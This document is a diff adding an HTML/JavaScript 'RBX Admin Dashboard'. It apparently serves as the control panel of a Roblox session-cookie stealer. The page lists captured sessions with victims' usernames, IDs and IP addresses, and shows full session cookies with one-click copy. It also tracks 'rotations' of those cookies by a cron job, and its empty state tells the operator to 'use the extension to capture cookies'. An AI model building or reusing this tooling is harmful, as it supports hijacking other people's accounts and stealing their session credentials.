@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBX Admin Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0e1a;
+            --card: #111827;
+            --border: #1f2937;
+            --blue: #3b82f6;
+            --green: #10b981;
+            --red: #ef4444;
+            --yellow: #f59e0b;
+            --text: #f9fafb;
+            --dim: #9ca3af;
+            --muted: #6b7280;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(135deg, #111827, #1e1b4b);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .header h1 {
+            font-size: 1.4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--blue), #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header-stats {
+            display: flex;
+            gap: 20px;
+        }
+        .stat-box {
+            padding: 8px 16px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            text-align: center;
+        }
+        .stat-box .num {
+            font-size: 1.5rem;
+            font-weight: 800;
+        }
+        .stat-box .label {
+            font-size: 0.7rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .stat-alive .num { color: var(--green); }
+        .stat-die .num { color: var(--red); }
+        .stat-total .num { color: var(--blue); }
+
+        .config-bar {
+            background: rgba(59,130,246,0.08);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 32px;
+            display: flex;
+            gap: 24px;
+            font-size: 0.8rem;
+            color: var(--dim);
+        }
+        .config-bar span { color: var(--blue); font-weight: 600; }
+
+        .container { padding: 24px 32px; }
+
+        .session-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            transition: border-color 0.3s;
+        }
+        .session-card:hover { border-color: var(--blue); }
+        .session-card.alive { border-left: 4px solid var(--green); }
+        .session-card.die { border-left: 4px solid var(--red); }
+        .session-card.paused { border-left: 4px solid var(--yellow); }
+
+        .session-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+        .session-user {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .user-avatar {
+            width: 40px; height: 40px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--blue), #8b5cf6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1rem;
+        }
+        .user-info h3 { font-size: 1rem; font-weight: 700; }
+        .user-info p { font-size: 0.75rem; color: var(--dim); }
+
+        .status-badge {
+            padding: 5px 14px;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+        .status-alive { background: rgba(16,185,129,0.15); color: var(--green); }
+        .status-die { background: rgba(239,68,68,0.15); color: var(--red); }
+        .status-paused { background: rgba(245,158,11,0.15); color: var(--yellow); }
+
+        .session-body { padding: 16px 20px; }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .info-item {
+            background: rgba(255,255,255,0.03);
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .info-item .lbl {
+            font-size: 0.65rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+        .info-item .val {
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .countdown-box {
+            background: linear-gradient(135deg, rgba(59,130,246,0.1), rgba(139,92,246,0.08));
+            border: 1px solid rgba(59,130,246,0.2);
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .countdown-box.overdue {
+            background: linear-gradient(135deg, rgba(16,185,129,0.1), rgba(6,182,212,0.08));
+            border-color: rgba(16,185,129,0.3);
+        }
+        .countdown-label {
+            font-size: 0.78rem;
+            color: var(--dim);
+        }
+        .countdown-timer {
+            font-size: 1.4rem;
+            font-weight: 800;
+            font-variant-numeric: tabular-nums;
+        }
+        .countdown-timer.overdue { color: var(--green); }
+
+        .progress-bar {
+            height: 4px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 2px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            border-radius: 2px;
+            background: linear-gradient(90deg, var(--green), var(--blue));
+            transition: width 1s linear;
+        }
+
+        .cookie-section {
+            margin-top: 12px;
+        }
+        .cookie-label {
+            font-size: 0.7rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .cookie-value {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.72rem;
+            word-break: break-all;
+            line-height: 1.5;
+            color: #e5e7eb;
+            max-height: 100px;
+            overflow-y: auto;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .cookie-value:hover { border-color: var(--blue); }
+        .cookie-value.copied {
+            border-color: var(--green);
+            box-shadow: 0 0 10px rgba(16,185,129,0.2);
+        }
+        .copy-btn {
+            background: rgba(59,130,246,0.15);
+            color: var(--blue);
+            border: none;
+            padding: 3px 10px;
+            border-radius: 6px;
+            font-size: 0.65rem;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .copy-btn:hover { background: rgba(59,130,246,0.3); }
+
+        .refresh-btn {
+            background: linear-gradient(135deg, var(--blue), #2563eb);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            transition: all 0.2s;
+        }
+        .refresh-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(59,130,246,0.3);
+        }
+
+        .auto-update {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 10px 16px;
+            font-size: 0.75rem;
+            color: var(--dim);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .pulse-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--muted);
+        }
+        .empty-state h2 { font-size: 1.2rem; margin-bottom: 8px; color: var(--dim); }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>RBX ADMIN DASHBOARD</h1>
+        <div class="header-stats">
+            <div class="stat-box stat-alive">
+                <div class="num" id="aliveCount">0</div>
+                <div class="label">Alive</div>
+            </div>
+            <div class="stat-box stat-die">
+                <div class="num" id="dieCount">0</div>
+                <div class="label">Die</div>
+            </div>
+            <div class="stat-box stat-total">
+                <div class="num" id="totalCount">0</div>
+                <div class="label">Total</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="config-bar">
+        <div>Refresh Interval: <span id="cfgInterval">--</span></div>
+        <div>Cookie Max Age: <span id="cfgAge">--</span></div>
+        <div>Server Time: <span id="cfgTime">--</span></div>
+        <div>Auto-update: <span>3s</span></div>
+    </div>
+
+    <div class="container" id="sessionsContainer">
+        <div class="empty-state">
+            <h2>Loading...</h2>
+            <p>Fetching session data</p>
+        </div>
+    </div>
+
+    <div class="auto-update">
+        <div class="pulse-dot"></div>
+        Live updating
+    </div>
+
+    <script>
+        let previousCookies = {};
+
+        function formatTime(seconds) {
+            if (seconds <= 0) return 'NOW';
+            const m = Math.floor(seconds / 60);
+            const s = seconds % 60;
+            if (m > 60) {
+                const h = Math.floor(m / 60);
+                const rm = m % 60;
+                return `${h}h ${rm}m ${s}s`;
+            }
+            return `${m}m ${s}s`;
+        }
+
+        function formatAge(seconds) {
+            if (seconds < 60) return `${seconds}s ago`;
+            const m = Math.floor(seconds / 60);
+            if (m < 60) return `${m}m ago`;
+            const h = Math.floor(m / 60);
+            return `${h}h ${m % 60}m ago`;
+        }
+
+        function copyToClipboard(text, el) {
+            navigator.clipboard.writeText(text).then(() => {
+                el.classList.add('copied');
+                setTimeout(() => el.classList.remove('copied'), 1500);
+            });
+        }
+
+        function renderSessions(data) {
+            const container = document.getElementById('sessionsContainer');
+            const sessions = data.sessions;
+            const config = data.config;
+
+            // Update stats
+            const alive = sessions.filter(s => s.status === 'ALIVE').length;
+            const die = sessions.filter(s => s.status === 'DIE').length;
+            document.getElementById('aliveCount').textContent = alive;
+            document.getElementById('dieCount').textContent = die;
+            document.getElementById('totalCount').textContent = sessions.length;
+            document.getElementById('cfgInterval').textContent = config.refreshIntervalMinutes + ' min';
+            document.getElementById('cfgAge').textContent = config.cookieMaxAgeHours + 'h';
+            document.getElementById('cfgTime').textContent = new Date(config.serverTime).toLocaleTimeString('vi-VN');
+
+            if (sessions.length === 0) {
+                container.innerHTML = '<div class="empty-state"><h2>No Sessions</h2><p>Use the extension to capture cookies</p></div>';
+                return;
+            }
+
+            let html = '';
+            for (const s of sessions) {
+                const statusClass = s.status.toLowerCase();
+                const initial = (s.username || '?')[0].toUpperCase();
+                const maxAge = config.cookieMaxAgeHours * 3600;
+                const progress = maxAge > 0 ? Math.min(100, ((maxAge - s.refreshIn) / maxAge) * 100) : 100;
+                const isOverdue = s.needsRefresh;
+
+                // Check if cookie changed
+                const prevCookie = previousCookies[s.userId] || '';
+                const cookieChanged = prevCookie && prevCookie !== s.cookie;
+                if (s.cookie) previousCookies[s.userId] = s.cookie;
+
+                html += `
+                <div class="session-card ${statusClass}">
+                    <div class="session-header">
+                        <div class="session-user">
+                            <div class="user-avatar">${initial}</div>
+                            <div class="user-info">
+                                <h3>${s.username || 'Unknown'}</h3>
+                                <p>ID: ${s.userId} | ${s.displayName || ''}</p>
+                            </div>
+                        </div>
+                        <span class="status-badge status-${statusClass}">${s.status}</span>
+                    </div>
+                    <div class="session-body">
+                        <div class="info-grid">
+                            <div class="info-item">
+                                <div class="lbl">Game</div>
+                                <div class="val">${s.game || 'N/A'}</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="lbl">Last Updated</div>
+                                <div class="val">${formatAge(s.ageSeconds)}</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="lbl">Cookie Length</div>
+                                <div class="val">${s.cookie ? s.cookie.length : 0} chars</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="lbl">IP Address</div>
+                                <div class="val">${s.ip || 'N/A'}</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="lbl">Refresh Count</div>
+                                <div class="val" style="color:var(--blue)">${s.refreshCount || 0}x rotated</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="lbl">Created</div>
+                                <div class="val">${s.createdAt ? new Date(s.createdAt).toLocaleString('vi-VN') : 'N/A'}</div>
+                            </div>
+                        </div>
+
+                        ${s.status === 'ALIVE' ? `
+                        <div class="countdown-box ${isOverdue ? 'overdue' : ''}">
+                            <div>
+                                <div class="countdown-label">${isOverdue ? 'REFRESHING ON NEXT CRON RUN' : 'Next refresh in'}</div>
+                                <div style="font-size:0.7rem;color:var(--muted);margin-top:2px">
+                                    Updated: ${new Date(s.updatedAt).toLocaleString('vi-VN')}
+                                </div>
+                            </div>
+                            <div class="countdown-timer ${isOverdue ? 'overdue' : ''}">${formatTime(s.refreshIn)}</div>
+                        </div>
+                        <div class="progress-bar">
+                            <div class="progress-fill" style="width:${progress}%"></div>
+                        </div>
+                        ` : ''}
+
+                        ${cookieChanged ? `
+                        <div style="background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.3);border-radius:8px;padding:10px 14px;margin-bottom:12px;font-size:0.78rem;color:var(--green);font-weight:600">
+                            COOKIE ROTATED! New cookie detected (Rotation #${s.refreshCount || '?'})
+                        </div>
+                        ` : ''}
+
+                        <div class="cookie-section">
+                            <div class="cookie-label">
+                                <span style="color:var(--green)">CURRENT COOKIE (NEW)</span>
+                                <button class="copy-btn" onclick="copyToClipboard(document.getElementById('cookie-${s.userId}').textContent, document.getElementById('cookie-${s.userId}'))">Copy</button>
+                            </div>
+                            <div class="cookie-value" id="cookie-${s.userId}" onclick="copyToClipboard(this.textContent, this)" style="border-color:rgba(16,185,129,0.3)">${s.cookie || 'N/A'}</div>
+                        </div>
+
+                        ${s.previousCookie ? `
+                        <div class="cookie-section" style="margin-top:10px">
+                            <div class="cookie-label">
+                                <span style="color:var(--red)">PREVIOUS COOKIE (OLD)</span>
+                                <button class="copy-btn" onclick="copyToClipboard(document.getElementById('oldcookie-${s.userId}').textContent, document.getElementById('oldcookie-${s.userId}'))">Copy</button>
+                            </div>
+                            <div class="cookie-value" id="oldcookie-${s.userId}" onclick="copyToClipboard(this.textContent, this)" style="border-color:rgba(239,68,68,0.3);opacity:0.7">${s.previousCookie}</div>
+                        </div>
+
+                        <div style="margin-top:10px;padding:10px 14px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.15);border-radius:8px;font-size:0.72rem;color:var(--dim)">
+                            <strong style="color:var(--blue)">Cookie Changed:</strong>
+                            ${s.cookie === s.previousCookie ? 
+                                '<span style="color:var(--yellow)"> Same (not rotated yet)</span>' : 
+                                '<span style="color:var(--green)"> YES — New cookie is different from old cookie</span>'
+                            }
+                        </div>
+                        ` : `
+                        <div style="margin-top:10px;padding:8px 14px;background:rgba(255,255,255,0.03);border-radius:8px;font-size:0.72rem;color:var(--muted)">
+                            No previous cookie — first capture, not yet rotated by cron
+                        </div>
+                        `}
+                    </div>
+                </div>`;
+            }
+
+            container.innerHTML = html;
+        }
+
+        async function fetchData() {
+            try {
+                const resp = await fetch('/api/admin/sessions');
+                const data = await resp.json();
+                renderSessions(data);
+            } catch (err) {
+                console.error('Fetch error:', err);
+            }
+        }
+
+        // Initial fetch + auto-update every 3 seconds
+        fetchData();
+        setInterval(fetchData, 3000);
+    </script>
+</body>
+</html>
